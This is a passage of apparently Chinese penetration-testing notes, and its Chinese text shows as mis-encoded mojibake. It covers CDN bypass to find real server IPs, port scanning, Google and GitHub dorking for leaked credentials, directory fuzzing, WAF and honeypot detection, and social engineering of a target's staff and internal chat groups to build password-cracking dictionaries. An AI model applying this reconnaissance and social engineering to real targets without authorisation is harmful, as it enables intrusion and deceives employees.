class="headerlink" title="IPæ®µä¿¡æ¯æ”¶é›†"></a>IPæ®µä¿¡æ¯æ”¶é›†</h2><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><h4 id="åˆ¤æ–­CDN"><a href="#åˆ¤æ–­CDN" class="headerlink" title="åˆ¤æ–­CDN"></a>åˆ¤æ–­CDN</h4><h5 id="å¤šåœ°ping"><a href="#å¤šåœ°ping" class="headerlink" title="å¤šåœ°ping"></a>å¤šåœ°ping</h5><p>å¦‚æœæ²¡æœ‰ä½¿ç”¨CDNï¼Œåˆ™åªä¼šæ˜¾ç¤ºä¸€ä¸ªIPåœ°å€ã€‚</p><ul><li><a href="http://www.webkaka.com/Ping.aspx">http://www.webkaka.com/Ping.aspx</a>ï¼ˆå›½å†…+å›½å¤–ï¼‰</li><li><a href="https://www.host-tracker.com/v3/check/">https://www.host-tracker.com/v3/check/</a>  ï¼ˆå›½å¤–ï¼‰</li></ul><h5 id="nslookupæ³•"><a href="#nslookupæ³•" class="headerlink" title="nslookupæ³•"></a>nslookupæ³•</h5><ul><li><p>æœåŠ¡å™¨åç§°</p><p><img src="/../images/image-20230509225424444-1685533751888.png" alt="image-20230509225424444"></p></li><li><p>åŒä¸€ä¸ªåŸŸåè§£æå¯¹åº”å¤šä¸ª IP åœ°å€</p><p><img src="/../images/image-20230509225313449-1685533751888.png" alt="image-20230509225313449"></p></li></ul><h5 id="è§‚å¯Ÿheader"><a href="#è§‚å¯Ÿheader" class="headerlink" title="è§‚å¯Ÿheader"></a>è§‚å¯Ÿheader</h5><ul><li>è§‚å¯Ÿè¯·æ±‚å“åº”çš„è¿”å›æ•°æ®çš„å¤´éƒ¨ï¼Œæ˜¯å¦æœ‰ CDN æœåŠ¡å•†æ ‡è¯†</li><li>è‹¥ asp æˆ–è€… asp.net ç½‘ç«™è¿”å›å¤´çš„ server ä¸æ˜¯ IISã€è€Œæ˜¯ Nginxï¼Œåˆ™å¤šåŠä½¿ç”¨äº†nginxåå‘ä»£ç†åˆ° CDN<img src="/../images/image-20210901093608312-1685533751888.png" alt="image-20210901093608312"></li></ul><h5 id="åœ¨çº¿ç½‘ç«™"><a href="#åœ¨çº¿ç½‘ç«™" class="headerlink" title="åœ¨çº¿ç½‘ç«™"></a>åœ¨çº¿ç½‘ç«™</h5><p><a href="https://www.cdnplanet.com/tools/cdnfinder/">https://www.cdnplanet.com/tools/cdnfinder/</a></p><h4 id="ç»•è¿‡CDN"><a href="#ç»•è¿‡CDN" class="headerlink" title="ç»•è¿‡CDN"></a>ç»•è¿‡CDN</h4><p>[BYPASS-CDN&#x2F;CDN 2023 å®Œå…¨æ”»å‡»æŒ‡å—ï¼ˆä¸€ï¼‰.md at main Â· bin-maker&#x2F;BYPASS-CDN Â· GitHub](<a href="https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN">https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN</a> 2023 å®Œå…¨æ”»å‡»æŒ‡å—ï¼ˆä¸€ï¼‰.md)</p><h5 id="CDNè´¹ç”¨"><a href="#CDNè´¹ç”¨" class="headerlink" title="CDNè´¹ç”¨"></a>CDNè´¹ç”¨</h5><p>CDN åŠ é€Ÿéœ€è¦æ”¯ä»˜ä¸€å®šçš„è´¹ç”¨ï¼Œæ‰€ä»¥<strong>å­ç«™ï¼Œå›½å¤–</strong>å¾ˆå¯èƒ½æ²¡æœ‰éƒ¨ç½²CDNã€‚</p><h5 id="å†å²-DNS-è®°å½•"><a href="#å†å²-DNS-è®°å½•" class="headerlink" title="å†å² DNS è®°å½•"></a>å†å² DNS è®°å½•</h5><p><a href="https://viewdns.info/iphistory/?domain=www.baidu.com">IP History - ViewDNS.info</a></p><p><a href="https://x.threatbook.com/v5/domain/www.baidu.com?source=top">å¾®æ­¥åœ¨çº¿Xæƒ…æŠ¥ç¤¾åŒº-å¨èƒæƒ…æŠ¥æŸ¥è¯¢_å¨èƒåˆ†æå¹³å°_å¼€æ”¾ç¤¾åŒº</a></p><h5 id="é‚®ç®±"><a href="#é‚®ç®±" class="headerlink" title="é‚®ç®±"></a>é‚®ç®±</h5><blockquote><p>ç”¨ç›®æ ‡é‚®ä»¶æœåŠ¡å™¨å‘é€é‚®ä»¶ç»™è‡ªå·±(QQé‚®ç®±)å†æŸ¥çœ‹é‚®ä»¶æºç ä¸€å®šæƒ…å†µä¸‹å¯ä»¥æ‰¾åˆ°çœŸå®IPï¼ˆæœåŠ¡ç«¯å’Œæˆ‘ä»¬å»ºç«‹è¿æ¥ï¼‰</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ª<code>å¥‡æ·«æŠ€å·§</code>ï¼Œé€šè¿‡å‘é€é‚®ä»¶ç»™ä¸€ä¸ªä¸å­˜åœ¨çš„é‚®ç®±åœ°å€ï¼Œæ¯”å¦‚ <a href="mailto:000xxx@domain.com">000xxx@domain.com</a> ï¼Œå› ä¸ºè¯¥ç”¨æˆ·ä¸å­˜åœ¨ï¼Œæ‰€ä»¥å‘é€å°†å¤±è´¥ï¼Œå¹¶ä¸”è¿˜ä¼šæ”¶åˆ°ä¸€ä¸ªåŒ…å«å‘é€è¯¥ç”µå­é‚®ä»¶ç»™ä½ çš„æœåŠ¡å™¨çš„çœŸå® IP é€šçŸ¥ã€‚</p></blockquote><ul><li>RSS è®¢é˜…</li><li>é‚®ç®±æ³¨å†Œã€æ¿€æ´»å¤„</li><li>é‚®ç®±æ‰¾å›å¯†ç å¤„</li><li>äº§å“æ›´æ–°çš„é‚®ä»¶æ¨é€</li><li>æŸä¸šåŠ¡æ‰§è¡Œåå‘é€çš„é‚®ä»¶é€šçŸ¥</li><li>å‘˜å·¥é‚®ç®±ã€é‚®ä»¶ç®¡ç†å¹³å°ç­‰å…¥å£å¤„çš„å¿˜è®°å¯†ç </li></ul><h5 id="virtual-host-ç¢°æ’"><a href="#virtual-host-ç¢°æ’" class="headerlink" title="virtual-host ç¢°æ’"></a>virtual-host ç¢°æ’</h5><p>åŸç†ï¼š<a href="https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg">https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg</a></p><ul><li>å½“æˆ‘ä»¬æ”¶é›†äº†ç›®æ ‡è¶³å¤Ÿå¤šçš„å¯èƒ½çš„çœŸå® IP æ—¶ï¼Œå¯ä»¥é€šè¿‡ IP å’Œå­åŸŸçš„ç¢°æ’ï¼Œæ¥æ‰¹é‡è·å¾—å‘½ä¸­ç›®æ ‡ä»¥åŠç›®æ ‡å“ªäº›çš„å­åŸŸã€‚</li><li>åœ¨çº¿æ”¶é›†å·¥å…· <a href="https://pentest-tools.com/information-gathering/find-virtual-hosts">https://pentest-tools.com/information-gathering/find-virtual-hosts</a></li></ul><h5 id="ç©ºé—´æµ‹ç»˜å¼•æ“"><a href="#ç©ºé—´æµ‹ç»˜å¼•æ“" class="headerlink" title="ç©ºé—´æµ‹ç»˜å¼•æ“"></a>ç©ºé—´æµ‹ç»˜å¼•æ“</h5><ul><li><p>favicon.ico å“ˆå¸Œç‰¹å¾</p></li><li><p>ç½‘é¡µæºç ç‰¹å¾å€¼</p><blockquote><p>åœ¨æœåŠ¡å™¨æº IP åœ°å€å…è®¸è®¿é—®å¹¶ä¸”è¿”å›çš„ä¹Ÿæ˜¯ç±»ä¼¼çš„ç½‘ç«™å†…å®¹æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ä¾¦å¯Ÿé¡µé¢æºç ä¸­ JS ã€CSS ã€HTML ç­‰ä¸€ç³»åˆ—é™æ€ç‰¹å¾å€¼ï¼Œç„¶åç”¨ Shodan ã€Zoomeye ã€Censys ç­‰æœç´¢å¼•æ“è¿›è¡ŒåŒ¹é…æœç´¢ï¼Œä»è€Œå®šä½ IP ã€‚</p></blockquote></li></ul><h4 id="çœŸå®-IP-ä½¿ç”¨"><a href="#çœŸå®-IP-ä½¿ç”¨" class="headerlink" title="çœŸå® IP ä½¿ç”¨"></a>çœŸå® IP ä½¿ç”¨</h4><p>åœ¨è·å–åˆ°çœŸå®IPåï¼Œé€šè¿‡ç›´æ¥è®¿é—®IPå¯èƒ½æ— æ³•è®¿é—®</p><ul><li><p>ä¿®æ”¹ hosts æ–‡ä»¶</p></li><li><p>burpsuite æµ‹è¯•</p><p><img src="/../images/image-20230510181257028-1685533751888.png" alt="image-20230510181257028"></p></li></ul><h3 id="Cæ®µåŠç«¯å£æ‰«æ"><a href="#Cæ®µåŠç«¯å£æ‰«æ" class="headerlink" title="Cæ®µåŠç«¯å£æ‰«æ"></a>Cæ®µåŠç«¯å£æ‰«æ</h3><h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">masscan</span><br><span class="line">fscan </span><br><span class="line">fscanç»“æœå¤„ç†ï¼š</span><br><span class="line">https://github.com/ZororoZ/fscanOutput</span><br><span class="line"></span><br><span class="line">TXPortMap</span><br></pre></td></tr></table></figure><h4 id="å¸¸è§ç«¯å£"><a href="#å¸¸è§ç«¯å£" class="headerlink" title="å¸¸è§ç«¯å£"></a>å¸¸è§ç«¯å£</h4><p><a href="http://zhuabapa.top/2020/06/03/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">â€˜å¸¸ç”¨ç«¯å£åˆ©ç”¨æ€»ç»“â€™ | zer0_c|imbâ€™s blog</a></p><h1 id="æ•æ„Ÿä¿¡æ¯æ”¶é›†"><a href="#æ•æ„Ÿä¿¡æ¯æ”¶é›†" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ”¶é›†"></a>æ•æ„Ÿä¿¡æ¯æ”¶é›†</h1><h2 id="ä¸ºä»€ä¹ˆ-1"><a href="#ä¸ºä»€ä¹ˆ-1" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h2><ul><li><p>è¿æ°”å¥½ï¼Œä¸€æ­¥åˆ°ä½</p></li><li><p>åˆ¶ä½œæœ‰é’ˆå¯¹æ€§çš„å¼±å£ä»¤å­—å…¸</p></li><li><p>ğŸ£</p></li></ul><h2 id="æœç´¢å¼•æ“-1"><a href="#æœç´¢å¼•æ“-1" class="headerlink" title="æœç´¢å¼•æ“"></a>æœç´¢å¼•æ“</h2><ul><li><p>é’ˆå¯¹ä¿¡æ¯æ³„éœ²çš„åœ¨çº¿ç½‘ç«™</p><ul><li><p><a href="https://leakix.net/">LeakIX</a></p></li><li><p><a href="https://intelx.io/">https://intelx.io/</a></p></li><li><p><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a></p></li><li><p><a href="https://aleph.occrp.org/">https://aleph.occrp.org/</a></p></li><li><p><a href="https://dehashed.com/">https://dehashed.com/</a></p></li></ul></li><li><p><code>Google Hacking</code></p><ul><li><p>å¸¸ç”¨è¯­æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com  è´¦å· | å¯†ç  | å·¥å· | å­¦å· | èº«ä»½è¯ | å…¬ç¤º | é‚®ç®±</span><br></pre></td></tr></table></figure></li><li><p>å·¥å…·</p><p><a href="https://github.com/dwisiswant0/go-dork">https://github.com/dwisiswant0/go-dork</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\go-dork.exe -q &quot;[è¯­æ³•]&quot; -p [é¡µé¢æ•°é‡] -x http://127.0.0.1:33210 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¸€é¡µ10ä¸ªæ•°æ®</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-e æŒ‡å®šå¼•æ“ æµ‹è¯•äº†åªæœ‰googleå¯ä»¥</span><br><span class="line">Google, Shodan, Bing, Duck, Yahoo, Ask</span><br></pre></td></tr></table></figure><p>â€‹<img src="/../images/image-20230510222146978-1685533751888.png" alt="image-20230510222146978"></p></li></ul></li></ul><p>â€‹</p><ul><li><p>ç½‘ç«™</p><p><a href="https://ght.se7ensec.cn/#">åœ¨çº¿Google Hackingå°å·¥å…·</a></p><p><img src="/../images/image-20230509215656848-1685533751889.png" alt="image-20230509215656848"></p><p><a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database (GHDB) - Google Dorks, OSINT, Recon</a></p><p><img src="/../images/image-20230509151606375-1685533751889.png" alt="image-20230509151606375"></p></li></ul><h2 id="ç›®å½•-x2F-æ–‡ä»¶æ‰«æ"><a href="#ç›®å½•-x2F-æ–‡ä»¶æ‰«æ" class="headerlink" title="ç›®å½•&#x2F;æ–‡ä»¶æ‰«æ"></a>ç›®å½•&#x2F;æ–‡ä»¶æ‰«æ</h2><p><strong>å–å†³äºå­—å…¸ï¼Œéœ€è¦ç§¯ç´¯å­—å…¸</strong></p><ul><li><p>å·¥å…·</p><ul><li><p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -c -w /path/to/wordlist -u https://target/FUZZ</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨éœ€è¦æµ‹è¯•çš„åœ°æ–¹åŠ ä¸ŠFUZZ</p></blockquote></li><li><p><a href="https://github.com/lemonlove7/dirsearch_bypass403">https://github.com/lemonlove7/dirsearch_bypass403</a></p><blockquote><p>æµç¨‹ï¼šdirsearchè¿›è¡Œç›®å½•æ‰«æâ€”&gt;å°†æ‰€æœ‰403çŠ¶æ€çš„ç›®å½•è¿›è¡Œä¿å­˜â€“&gt;æ˜¯å¦è¿›è¡Œjsfindâ€“&gt;æ˜¯(è¿›è¡Œjsçˆ¬å–urlå’ŒåŸŸåï¼Œå°†çˆ¬å–åˆ°çš„urlè¿›è¡ŒçŠ¶æ€ç è¯†åˆ«å¦‚æœæ˜¯403çŠ¶æ€åˆ™è¿›è¡Œä¿å­˜)â€“&gt;è¿›è¡Œ403ç»•è¿‡ ï¼ˆä¸è¿‡jsfinderä¸å»ºè®®ä½¿ç”¨ï¼Œä¸å¦‚urlfinderå¥½ç”¨ï¼‰</p></blockquote></li><li><p><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a></p><blockquote><p><strong>BBScan</strong> æ˜¯ä¸€ä¸ªé«˜å¹¶å‘ã€è½»é‡çº§çš„ä¿¡æ¯æ³„éœ²æ‰«æå·¥å…·ã€‚</p></blockquote></li><li><p><a href="https://blog.csdn.net/qq_43427482/article/details/110008286">https://blog.csdn.net/qq_43427482/article/details/110008286</a></p><blockquote><p>æ•æ„Ÿæ–‡ä»¶</p></blockquote></li></ul></li><li><p>å­—å…¸</p><p>å°†å·¥å…·å†…ç½®å­—å…¸å’Œå…¬å¼€å­—å…¸è¿›è¡Œæ•´åˆï¼Œç„¶åè‡ªå·±åœ¨å®é™…ä¸­é‡åˆ°çš„å†æ·»åŠ ã€‚</p></li></ul><h2 id="JSä¿¡æ¯"><a href="#JSä¿¡æ¯" class="headerlink" title="JSä¿¡æ¯"></a>JSä¿¡æ¯</h2><p>å¯èƒ½æ³„éœ²æ¥å£ï¼Œåå°åœ°å€ï¼Œå¯†ç ç­‰æ•æ„Ÿä¿¡æ¯</p><h3 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h3><ul><li><p>å·¥å…·</p><p><code>Urlfinder</code>  ï¼ˆæ¨èï¼‰</p><p><code>JSfinder</code></p><p><a href="https://github.com/mickeystone/JSFinderPlus">https://github.com/mickeystone/JSFinderPlus</a></p></li><li><p>æµè§ˆå™¨æ’ä»¶</p><p>ç†ŠçŒ«å¤´â€“<code>FindSomething</code></p></li></ul><h3 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h3><p><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p><h2 id="ä»£ç æ‰˜ç®¡å¹³å°"><a href="#ä»£ç æ‰˜ç®¡å¹³å°" class="headerlink" title="ä»£ç æ‰˜ç®¡å¹³å°"></a>ä»£ç æ‰˜ç®¡å¹³å°</h2><ul><li><p>github</p><p>å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/damit5/gitdorks_go</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./gitdorks_go_amd_linux -gd ../Dorks/smalldorks.txt -nws 20 -target gm7.org -tf ../tokenFile/tf.txt -ew 3</span><br></pre></td></tr></table></figure><blockquote><p><code>./tokenFile/tf.txt</code> â†’ <code>Github access token</code></p><p><code>../Dorks/smalldorks.txt</code> â†’  <code>å…³é”®å­—å­—å…¸</code></p></blockquote></li><li><p>GitLab: <a href="https://about.gitlab.com/">https://about.gitlab.com/</a></p></li><li><p>gitee: <a href="https://gitee.com/">https://gitee.com/</a></p></li></ul><h2 id="ç½‘ç›˜ä¿¡æ¯"><a href="#ç½‘ç›˜ä¿¡æ¯" class="headerlink" title="ç½‘ç›˜ä¿¡æ¯"></a>ç½‘ç›˜ä¿¡æ¯</h2><p>èšåˆç½‘ç«™ï¼š<a href="https://www.chaonengsou.com/">è¶…èƒ½æœ - ç™¾åº¦ç½‘ç›˜æœç´¢ç¥å™¨</a></p><h2 id="å†å²æ¼æ´"><a href="#å†å²æ¼æ´" class="headerlink" title="å†å²æ¼æ´"></a>å†å²æ¼æ´</h2><blockquote><p>ä»å„ç¬¬ä¸‰æ–¹å†å²æ¼æ´åº“ä¸­æŸ¥æ‰¾ç›®æ ‡æ›¾ç»æ³„éœ²çš„ å„ç§æ•æ„Ÿè´¦å·å¯†ç  [ å›½å†…ç›®æ ‡å¾ˆå¥½ä½¿ï¼Ÿ ]</p></blockquote><h2 id="æŠ€æœ¯æ–‡æ¡£-x2F-wiki-x2F-çŸ¥è¯†åº“"><a href="#æŠ€æœ¯æ–‡æ¡£-x2F-wiki-x2F-çŸ¥è¯†åº“" class="headerlink" title="æŠ€æœ¯æ–‡æ¡£ &#x2F; wiki &#x2F;çŸ¥è¯†åº“"></a>æŠ€æœ¯æ–‡æ¡£ &#x2F; wiki &#x2F;çŸ¥è¯†åº“</h2><p>ç›®æ ‡è‡ªå·±å¯¹å¤–æä¾›çš„å„ç§æ–‡æ¡£é‡Œæ³„éœ²çš„å„ç§è´¦å·å¯†ç åŠå…¶å®ƒæ•æ„Ÿä¿¡æ¯</p><ul><li><p>å®˜ç½‘</p></li><li><p><a href="https://www.yuque.com/dashboard">å·¥ä½œå° Â· è¯­é›€</a></p></li><li><p>ç™¾åº¦æ–‡åº“ï¼š<a href="https://wenku.baidu.com/">https://wenku.baidu.com</a></p><p>åŸåˆ›åŠ›æ–‡æ¡£ï¼š<a href="https://max.book118.com/">https://max.book118.com</a></p><p>å‡Œé£äº‘ï¼š<a href="https://wenku.lingfengyun.com/">https://wenku.lingfengyun.com</a></p></li></ul><h2 id="ç¤¾å·¥"><a href="#ç¤¾å·¥" class="headerlink" title="ç¤¾å·¥"></a>ç¤¾å·¥</h2><h3 id="æ‰“å…¥ç›®æ ‡å†…éƒ¨"><a href="#æ‰“å…¥ç›®æ ‡å†…éƒ¨" class="headerlink" title="æ‰“å…¥ç›®æ ‡å†…éƒ¨"></a>æ‰“å…¥ç›®æ ‡å†…éƒ¨</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŠ å…¥å†…éƒ¨QQç¾¤ / å¾®ä¿¡ç¾¤ / é’‰é’‰ç¾¤ ç­‰</span><br><span class="line">ç¤¾å·¥å†…éƒ¨äººå‘˜</span><br></pre></td></tr></table></figure><h3 id="ä¸ªäººä¿¡æ¯ä½¿ç”¨"><a href="#ä¸ªäººä¿¡æ¯ä½¿ç”¨" class="headerlink" title="ä¸ªäººä¿¡æ¯ä½¿ç”¨"></a>ä¸ªäººä¿¡æ¯ä½¿ç”¨</h3><ul><li><p>å°†å‰é¢æ”¶é›†åˆ°çš„å§“åï¼Œé‚®ç®±ï¼Œæ‰‹æœºå·ç­‰ä¸ªäººä¿¡æ¯æ”¾å…¥ç¤¾å·¥åº“æŸ¥è¯¢</p></li><li><p><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p><blockquote><p>é€šè¿‡æœç´¢å¼•æ“ã€PGPæœåŠ¡å™¨ä»¥åŠSHODANæ•°æ®åº“æ”¶é›†ç”¨æˆ·çš„emailï¼Œå­åŸŸåï¼Œä¸»æœºï¼Œé›‡å‘˜åï¼Œå¼€æ”¾ç«¯å£å’Œbannerä¿¡æ¯ã€‚</p></blockquote></li><li><p>ç”Ÿæˆç¤¾å·¥å­—å…¸ï¼Œè¿›è¡Œå£ä»¤çˆ†ç ´</p><p><a href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator">https://github.com/zgjx6/SocialEngineeringDictionaryGenerator</a></p></li></ul><h3 id="å·¥å…·-1"><a href="#å·¥å…·-1" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/n0tr00t/Sreg</span><br><span class="line">reg007</span><br></pre></td></tr></table></figure><h1 id="æŒ‡çº¹è¯†åˆ«"><a href="#æŒ‡çº¹è¯†åˆ«" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h1><h2 id="ä¸ºä»€ä¹ˆ-2"><a href="#ä¸ºä»€ä¹ˆ-2" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h2><ul><li><p><strong>ç­›é€‰å‡ºæœ€å¯èƒ½æœ‰æ¼æ´çš„ç‚¹</strong></p></li><li><p><strong>è¯†åˆ«waf</strong></p></li></ul><h2 id="æŒ‡çº¹è¯†åˆ«-1"><a href="#æŒ‡çº¹è¯†åˆ«-1" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><h3 id="Webåº”ç”¨æ¡†æ¶"><a href="#Webåº”ç”¨æ¡†æ¶" class="headerlink" title="Webåº”ç”¨æ¡†æ¶"></a>Webåº”ç”¨æ¡†æ¶</h3><h4 id="å·¥å…·-2"><a href="#å·¥å…·-2" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><ul><li><p><a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></p><p><img src="/../images/image-20230511175807888-1685533751889.png" alt="image-20230511175807888"></p></li><li><p><a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> </p><p><img src="/../images/image-20230510175457574-1685533751889.png" alt="image-20230510175457574"></p></li><li><p><a href="https://github.com/broken5/bscan">https://github.com/broken5/bscan</a></p><p><img src="/../images/image-20230510175516456-1685533751889.png" alt="image-20230510175516456"></p></li><li><p><a href="https://github.com/EASY233/Finger">https://github.com/EASY233/Finger</a></p><p><img src="/../images/image-20230510175534390-1685533751889.png" alt="image-20230510175534390"></p></li><li><p><a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><p><img src="/../images/image-20230511110926338-1685533751889.png" alt="image-20230511110926338"></p></li></ul><h4 id="åœ¨çº¿ç½‘ç«™-1"><a href="#åœ¨çº¿ç½‘ç«™-1" class="headerlink" title="åœ¨çº¿ç½‘ç«™"></a>åœ¨çº¿ç½‘ç«™</h4><ul><li><p><a href="https://fp.shuziguanxing.com/#/">æŒ‡çº¹æ”¶å½•å¹³å°</a></p></li><li><p><a href="https://hackertarget.com/whatweb-scan/">https://hackertarget.com/whatweb-scan/</a></p></li><li><p><a href="http://www.yunsee.cn/">äº‘æ‚‰äº’è”ç½‘WEBèµ„äº§åœ¨çº¿æ¢³ç†|åœ¨çº¿CMSæŒ‡çº¹è¯†åˆ«å¹³å° - äº‘æ‚‰å®‰å…¨å¹³å°</a>ï¼ˆè¦ä¼ä¸šæ³¨å†Œï¼‰</p></li></ul><h4 id="æµè§ˆå™¨æ’ä»¶"><a href="#æµè§ˆå™¨æ’ä»¶" class="headerlink" title="æµè§ˆå™¨æ’ä»¶"></a>æµè§ˆå™¨æ’ä»¶</h4><p>Wappalyzer</p><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><ul><li><p>æŸ¥çœ‹è¿”å›åŒ…æœ‰æ— WAFå­—æ ·</p><p><img src="/../images/image-20230511233014884-1685533751889.png" alt="image-20230511233014884"></p></li><li><p><a href="https://github.com/EnableSecurity/wafw00f">WAFW00F </a></p></li><li><p>æŸ¥çœ‹æ‹¦æˆªé¡µé¢ä¿¡æ¯</p><blockquote><p>é€šè¿‡ä¸€äº›æ˜æ˜¾çš„æ³¨å…¥æ¥è§¦å‘waf</p></blockquote><p><a href="https://cloud.tencent.com/developer/beta/article/1872310">83ä¸ªWafæ‹¦æˆªé¡µé¢-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a>  ï¼ˆ5å¹´å‰ï¼‰</p><p><a href="https://mp.weixin.qq.com/s/8F060FU9g_78z57UKS-JsQ">30å‡ æ¬¾å¸¸è§WAFçš„æ‹¦æˆªé¡µæ•´ç†</a>   ï¼ˆ2021å¹´ï¼‰</p></li></ul><h3 id="èœœç½"><a href="#èœœç½" class="headerlink" title="èœœç½"></a>èœœç½</h3><p><a href="https://github.com/cnrstar/anti-honeypot">https://github.com/cnrstar/anti-honeypot</a></p><p><a href="https://send-safe-honeypot-hunter.apponic.com/">https://send-safe-honeypot-hunter.apponic.com/</a></p><h1 id="æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨"><a href="#æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨" class="headerlink" title="æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨"></a>æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨</h1><h2 id="åŸºæœ¬æµç¨‹"><a href="#åŸºæœ¬æµç¨‹" class="headerlink" title="åŸºæœ¬æµç¨‹"></a>åŸºæœ¬æµç¨‹</h2><p>ç»è¿‡ä¿¡æ¯æ”¶é›†å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webæœåŠ¡ ï¼ˆæ¶æ„ï¼Œä¸­é—´ä»¶ï¼Œç›®å½•ç»“æ„ï¼‰</span><br><span class="line">ç«¯å£æœåŠ¡</span><br><span class="line">æ•æ„Ÿä¿¡æ¯ ï¼ˆæ•æ„Ÿæ–‡ä»¶ï¼Œç¤¾å·¥ä¿¡æ¯ï¼‰</span><br><span class="line">é‡ç‚¹æ”»å‡»å¯¹è±¡</span><br><span class="line">ç«™ç‚¹æ˜¯å¦å­˜åœ¨waf</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¼æ‰«</span><br><span class="line">æ‰‹å·¥</span><br><span class="line">ç»•waf</span><br><span class="line">ä»£ç å®¡è®¡</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ†ç±»"><a href="#æ¼æ´åˆ†ç±»" class="headerlink" title="æ¼æ´åˆ†ç±»"></a>æ¼æ´åˆ†ç±»</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç³»ç»Ÿæ¼æ´ </span><br><span class="line">webæ¼æ´ </span><br><span class="line">ä¸­é—´ä»¶æ¼æ´ </span><br><span class="line">ç«¯å£æœåŠ¡æ¼æ´ </span><br><span class="line">ä¸šåŠ¡é€»è¾‘æ¼æ´</span><br><span class="line">é€šä¿¡å®‰å…¨</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‚ç…§æ¼æ´checklistæ¥è¿›è¡Œæ£€æµ‹ã€‚</p><p><strong>çº¢é˜Ÿï¼šé‡ç‚¹å…³æ³¨èƒ½<code>getshell</code>çš„æ¼æ´</strong></p><h2 id="wafç»•è¿‡"><a href="#wafç»•è¿‡" class="headerlink" title="wafç»•è¿‡"></a>wafç»•è¿‡</h2><ul><li><p>CTFçŸ¥è¯†</p></li><li><p><a href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Javaååºåˆ—åŒ–æ•°æ®ç»•WAFä¹‹åŠ å¤§é‡è„æ•°æ®</a></p></li><li><p>wafç»•è¿‡å­¦ä¹ </p></li></ul><h1 id="å¾…åš"><a href="#å¾…åš" class="headerlink" title="å¾…åš"></a>å¾…åš</h1><blockquote><p>æŠŠä¸Šé¢çš„å‡ ä¸ªæ­¥éª¤ï¼Œå·¥å…·ä¸²èµ·æ¥ï¼Œè¡Œæˆå¿«é€Ÿä¿¡æ¯æ”¶é›†ï¼Œå¿«é€Ÿæ¢æµ‹æ‰“ç‚¹ï¼Œæœ€å¥½å†™ä¸ªè´¯ç©¿æµç¨‹çš„å·¥å…·è°ƒç”¨çš„è„šæœ¬ã€‚</p></blockquote><p>å‚è€ƒï¼š<a href="https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/">https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/</a></p><h1 id="åæ¸—é€"><a 